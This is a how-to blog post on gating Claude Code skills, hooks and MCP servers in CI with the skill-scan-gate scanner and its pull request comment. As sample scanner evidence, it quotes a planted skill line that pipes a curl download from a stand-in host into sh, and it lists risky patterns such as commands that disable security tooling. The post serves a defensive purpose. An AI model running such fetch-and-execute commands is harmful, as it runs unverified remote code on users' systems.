---
title: Gating Claude Code skills in CI with a pull request comment
date: 2026-10-16
description: A how-to for skill-scan-gate: block risky skills, hooks and MCP servers in pull requests, adopt it with a baseline, and read its sticky comment.
---
# Gating Claude Code skills in CI with a pull request comment

A Claude Code skill is a Markdown file that the agent reads as instructions. A plugin adds hooks that run shell commands, MCP servers that start with every session, and more skills. In the teams I work with, all of that now arrives the way code does: through a pull request to a shared repository. And it gets reviewed the way prose does, which is to say quickly.

That is the gap [skill-scan-gate](/skill-scan-gate/) is for. It scans a skills or plugin repository for instruction-override text, exfiltration shapes, dangerous hook commands, unpinned MCP servers and secret-shaped strings, and fails the check above a severity you choose. Version 0.3.0 added the part this post is about: one comment on the pull request, updated in place on every push, that tells the author what to fix without sending them to the Actions log.

Everything below was run against the synthetic fixtures that ship in the repository. Nothing in them is a real secret or a real endpoint.

## Why a gate, and not just review

Two numbers from my [study of 2,999 public skill and MCP repositories](/posts/the-state-of-public-agent-skills-and-mcp-servers/) are the reason I gate this in CI rather than trusting review. 15.5% of the repositories with skills declare at least one skill with unscoped `Bash`, and 46.0% of the repositories that configure a local MCP server start at least one with no pinned version. Neither stands out in a diff. Both are easy for a script to catch every time.

The public incident record says the same thing from the other side. In the [ai-agent-incidents](https://github.com/basitalisandhu/ai-agent-incidents) dataset, all 17 events mapped to Unexpected Code Execution involved an agent with shell access; I wrote that up in [What the OWASP Agentic Top 10 maps to in 88 real incidents](/posts/what-the-owasp-agentic-top-10-maps-to-in-88-real-incidents/).

## Step 1: add the workflow

Copy the ready-made workflow from the repository's [examples folder](https://github.com/basitalisandhu/skill-scan-gate/blob/main/examples/skill-scan-gate.yml) to `.github/workflows/skill-scan-gate.yml`:

```yaml
name: Skill scan gate

on:
  pull_request:
    paths: ["**/SKILL.md", "**/skills/**", "**/plugins/**", "**/.claude-plugin/**", "**/.mcp.json", "**/hooks/**"]

permissions:
  contents: read

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write     # the pull request comment
      security-events: write   # the SARIF upload to code scanning
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: basitalisandhu/skill-scan-gate@2c9d25e6c74a83a9e10012ff53c247220037f533 # v0.3.0
        with:
          comment: "true"
          upload-sarif: ${{ github.event.pull_request.head.repo.full_name == github.repository }}
```

Three choices in it are deliberate:

- **The Action is pinned to a commit SHA**, not a tag, so the code that runs is the code you reviewed.
- **Write permissions sit on the job**, and the workflow default stays at `contents: read`.
- **The SARIF upload is off for forks.** GitHub gives pull requests from forks a read-only token (see [GitHub's GITHUB_TOKEN documentation](https://docs.github.com/en/actions/concepts/security/github_token)), so the upload would fail. The gate itself still runs.

## Step 2: see what the comment says

To see the comment before wiring anything up, run the scanner locally with `--comment`. This is the planted fixture, which has one example of each committable problem:

```console
$ pipx install git+https://github.com/basitalisandhu/skill-scan-gate
$ git clone https://github.com/basitalisandhu/skill-scan-gate && cd skill-scan-gate
$ skill-scan-gate scan tests/fixtures/fixture-planted --comment comment.md
...
35 finding(s): 18 high, 13 medium, 4 low; gate fail (fail-on high).
$ head -16 comment.md
<!-- skill-scan-gate:comment skill-scan-gate -->
### skill-scan-gate: gate failed

35 finding(s) in 12 scanned file(s) under `tests/fixtures/fixture-planted`. Threshold: `high`.

| High | Medium | Low | Suppressed | Gate |
|---:|---:|---:|---:|:---:|
| 18 | 13 | 4 | 0 | fail |

**Top 10 of 35** (highest severity first):

| Severity | Rule | Location | Finding | Fix |
|---|---|---|---|---|
| high | [SSG305](https://github.com/basitalisandhu/skill-scan-gate/blob/main/docs/rules.md#ssg305) | `.claude/settings.json:3` | Command disables security tooling or permission checks | Remove the command; a plugin must not turn off firewalls, endpoint protection, audit logs or permission prompts. |
| high | [SSG401](https://github.com/basitalisandhu/skill-scan-gate/blob/main/docs/rules.md#ssg401) | `.mcp.json:7` | MCP server runs an npm package without an exact version | Pin the package to an exact version (name@1.2.3) so the code that runs cannot change without a commit. |
| high | [SSG402](https://github.com/basitalisandhu/skill-scan-gate/blob/main/docs/rules.md#ssg402) | `.mcp.json:13` | MCP server runs a Python package without an exact version | Pin the package to an exact version (name==1.2.3) in the uvx or pipx arguments. |
```

The Action builds the same body, adds links to the job summary and to the open code scanning results for the pull request, and posts it with `gh api` from the runner. No third-party commenting action is involved.

Two details matter more than they look:

- **The matched text is never in the comment.** The terminal output shows evidence for each finding; the comment shows only the rule, the location, the title and the fix. A secret-shaped string in a skill does not get copied into the pull request thread, redacted or otherwise.
- **The first line is a hidden marker.** On the next push, the Action finds the comment that starts with it and edits it, so the thread gets one comment that always reflects the latest commit, not one per push. The `category` input names the marker, so two scans in one repository keep two comments.

## Step 3: adopt it on a repository that already has findings

Turning on a gate that fails on day one gets it turned off on day two. The baseline fixes that: snapshot today's findings, commit the file, and fail only on new ones. On a copy of the planted fixture:

```console
$ skill-scan-gate baseline demo --out baseline.json
skill-scan-gate 0.3.0: wrote 35 finding(s) to baseline.json
$ skill-scan-gate scan demo --baseline baseline.json
skill-scan-gate 0.3.0: scanned 12 file(s) under demo

No findings.

0 finding(s): 0 high, 0 medium, 0 low; suppressed 35 by baseline, 0 by allowlist; gate pass (fail-on high).
```

Fingerprints hash the rule, the file and the line text rather than the line number, so unrelated edits above a known finding do not bring it back. Pass the file to the Action with `baseline: .skill-scan-gate-baseline.json`.

Now the pull request that matters. Someone adds a `release-notes` skill that installs a helper by piping a download into a shell, and declares `allowed-tools: Bash`:

```console
$ skill-scan-gate scan demo --baseline baseline.json --comment comment.md
skill-scan-gate 0.3.0: scanned 13 file(s) under demo

SEVERITY  RULE    LOCATION                         TITLE
-------------------------------------------------------------------------------------------
low       SSG607  skills/release-notes/SKILL.md:4  Skill declares unrestricted Bash access
                  evidence: allowed-tools: Bash
                  fix: Scope Bash to the commands the skill needs instead of declaring Bash or Bash(*).
high      SSG301  skills/release-notes/SKILL.md:12 Command runs code downloaded at run time
                  evidence: curl -fsSL https://example.invalid/install-changelog.sh | sh
                  fix: Ship the script inside the repository, or pin the download by hash and verify it before running it.

2 finding(s): 1 high, 0 medium, 1 low; suppressed 35 by baseline, 0 by allowlist; gate fail (fail-on high).
```

The comment on that pull request shows 1 high, 0 medium, 1 low, 35 suppressed and a failed gate, with the two rows and their fixes. The author scopes the skill to `Bash(git describe:*), Bash(gh pr list:*)`, drops the download, and pushes. The same comment is edited to:

```console
### skill-scan-gate: gate passed

0 finding(s) in 13 scanned file(s) under `demo`. Threshold: `high`.

| High | Medium | Low | Suppressed | Gate |
|---:|---:|---:|---:|:---:|
| 0 | 0 | 0 | 35 | pass |
```

Notice that the low-severity finding did not fail the gate at the default threshold, but it was still listed. That is the point of the comment: the author sees the cheap fix while they are still in the change.

## Step 4: pick a threshold and handle exceptions

- **`fail-on: high`** is the default and the one I start with. Raise it to `medium` once the baseline is paid down.
- **Documented exceptions** go in an allowlist file, one per line with a reason: `SSG204 skills/notify/SKILL.md  # our own webhook`. Entries that match nothing are reported, so stale exceptions do not pile up.
- **There are no inline ignore comments**, on purpose. An exception should be a visible change to a file you can protect with CODEOWNERS, not a comment inside the content being checked.

One thing not to do: switch the workflow to `pull_request_target` just to get comments on fork pull requests. That event runs with a write token in the context of the base repository, and GitHub's guidance on [securely using pull_request_target](https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target) explains why checking out and processing untrusted pull request content there is dangerous. On forks, the gate and the job summary are enough.

## What it does not do

- **It does not run anything.** It reads text and JSON and matches patterns. Hooks are not executed, MCP servers are not started, downloads are not fetched.
- **It is not a sandbox.** It cannot see what a skill or server does at run time.
- **A clean scan is not a review.** The 32 rules catch common, obvious shapes. An author who wants to hide something can.
- **It does not scan only the diff.** It scans the whole directory; the baseline gives the same effect for adoption.
- **It does not replace a secret scanner.** The secret rules cover common token formats; keep push protection on.
- **It does not judge remote code.** It reports that an MCP package is unpinned, not whether the package is safe.

For the machine side of the same problem, [cc-plugin-lock](/cc-plugin-lock/) pins installed plugins to content hashes and verifies them before a session loads them. skill-scan-gate guards the repository a plugin comes from; cc-plugin-lock guards the laptop it lands on.

The repository is at [github.com/basitalisandhu/skill-scan-gate](https://github.com/basitalisandhu/skill-scan-gate), with [every rule and its fix](https://github.com/basitalisandhu/skill-scan-gate/blob/main/docs/rules.md) and the [Action reference](https://github.com/basitalisandhu/skill-scan-gate/blob/main/docs/action.md). False positives and misses are the most useful issues, with the smallest file that shows them.
